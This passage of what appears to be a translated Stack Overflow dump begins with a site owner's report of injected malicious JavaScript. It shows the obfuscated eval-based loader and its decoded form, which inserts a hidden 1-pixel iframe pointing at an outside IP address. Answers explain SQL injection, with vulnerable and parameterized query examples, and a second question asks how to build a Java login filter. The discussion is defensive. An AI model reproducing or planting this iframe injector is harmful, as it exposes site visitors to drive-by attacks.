      dbshre=103;
      if(dbshre){
         vfvwe=0;
         try{
            document;
         } catch(agdsg){
            vfvwe=1;
         }
         if(!vfvwe){
            e=eval;
         }
         s="";
         if(zz)
            for(i=0;i-480!=0;i++){
               if(window.document)
                  s+=ss(p(asgq[i],16));
            }
         if(window.document)
            e(s);
      }
   }
</script> 
```

嵌入的十六进制代码解析为以下 Javascript：

```
(function () {
    var houe = document.createElement('iframe');

    houe.src = 'http://216.119.114.164/esd.php';
    houe.style.position = 'absolute';
    houe.style.border = '0';
    houe.style.height = '1px';
    houe.style.width = '1px';
    houe.style.left = '1px';
    houe.style.top = '1px';

    if (!document.getElementById('houe')) {
        document.write('<div id=\'houe\'></div>');
        document.getElementById('houe').appendChild(houe);
    }
})(); 
```

它正在注入`div`以下元素：

```
<div id="mgkc"><iframe src="http://216.119.114.164/esd.php" style="position: absolute; border: 0px; height: 1px; width: 1px; left: 1px; top: 1px;"></iframe></div>

<div id="houe"><iframe src="http://216.119.114.164/esd.php" style="position: absolute; border: 0px; height: 1px; width: 1px; left: 1px; top: 1px;"></iframe></div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T21:46:51.640

> 我应该寻找什么？

假设这是一个 sql 注入问题（这听起来不错），您应该在您的 Web 应用程序代码中查找类似这样的内容：

```
sql = "SELECT columns FROM SomeTable WHERE SomeColumn=" + someVariable 
```

如果您让我们知道您使用哪种语言，我可能会给出一个更具代表性的示例，但主要的是，无论您在何处使用字符串连接将来自用户的信息放入 sql 查询中——*即使您通过函数运行它消毒、清洁或逃避它*——你很脆弱。请注意，这甚至不是插入/更新/删除语句。它只是一个选择，语义表明 sql 甚至期望数字类型。没关系：攻击者仍然可以使用它来更改数据中的内容。

如果您使用的是 ORM，您甚至可能只是构建 WHERE 子句的一部分，因此它甚至可能只是这样：

```
filter = "SomeDataField='" + someVariable + "'" 
```

处理它的正确方法是使用称为参数化查询或准备好的语句的东西，具体取决于您在操场上和哪些孩子一起玩。这些使用看起来更像这样的代码：

```
sql = "SELECT columns" + " FROM SomeTable WHERE SomeColumn= ?"
// Other code to define and set a parameter for SomeColumn goes here 
```

请注意，我确实在那里使用了字符串连接（只是为了展示，以证明您可以通过这种方式构建查询），但我没有使用它将用户输入替换为查询。这里要理解的重要一点是，使用此方案（如果实施得当），用户输入*永远不会*直接替换到查询中，甚至在数据库服务器上也不会。相反，它是单独传输的，并且也被数据库引擎视为变量。

同样，如果我知道您使用的语言/平台，我可能会提供更好的表示。作为示例（这次我将使用 UPDATE），这是在 C# 中使用 Sql Server 安全执行此操作的一种方法：

```
string sql = "UPDATE table SET column= @SomeVariable WHERE ID= @UserID";
using (var cn = new SqlConnection("connection string here"))
using (var cmd = new SqlCommand(sql, cn))
{
    cmd.Parameters.Add("@SomeVariable", SqlDbType.VarChar, 50).Value = someVariable;
    cmd.Parameters.Add("@UserID", SqlDbType.Int).Value = UserID;

    cn.Open();
    cmd.ExecuteNonQuery();
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T21:46:03.627

您网站上的表单如何与您的数据库交互？他们是创建与数据库的直接连接还是使用 Web 服务？如果您直接在数据库上执行查询，那么您应该参数化您的查询。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-10T22:03:00.340

有多个网站漏洞扫描程序可以测试网站上的 SQL 注入和其他漏洞。这是一个简短的列表 -检查[https://security.stackexchange.com/questions/32/what-tools-are-available-to-assess-the-security-of-a-web-application/38#38](https://security.stackexchange.com/questions/32/what-tools-are-available-to-assess-the-security-of-a-web-application/38#38)较大的一个：

*   [http://www.acunetix.com/vulnerability-scanner/](http://www.acunetix.com/vulnerability-scanner/)
*   [https://code.google.com/p/skipfish/](https://code.google.com/p/skipfish/)

另外还可以查看这些链接：

*   [https://stackoverflow.com/questions/4479499/best-free-vulnerability-scanners-that-c​​heck-your-websites-php-mysql-code](https://stackoverflow.com/questions/4479499/best-free-vulnerability-scanners-that-check-your-websites-php-mysql-code)

通常，您还需要搜索代码库中的每个 SQL 命令，并验证没有未经处理的输入被发送到数据库。

# java - 如何创建一个简单的用户验证 java 过滤器？

> ID：15936999
> 
> 赞同：0
> 
> 时间：2013-04-10T21:44:08.253
> 
> 标签：java, jsp, session, servlets, servlet-filters

假设我有四个 jsp：signInInfo.jsp、signIn.jsp、home.jsp 和 about.jsp。我不希望用户在登录之前能够看到 home.jsp 或 about.jsp。如果他们在登录之前查看 signInInfo.jsp 和 signIn.jsp 就可以了。如果用户尚未登录尝试访问 home 或 about，它们应该被重定向到 signIn.jsp。有人可以告诉我如何实现这个简单的过滤器。事实证明，它比我最初预期的更具挑战性。谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-30T14:21:48.257

正如 Luiggi 所说，这已经在[StackOverflow Servlet-Filters wiki](https://stackoverflow.com/tags/servlet-filters/info)中介绍过。对于那些正在寻找简单的过滤器实现的人来说，这是一篇很棒的文章。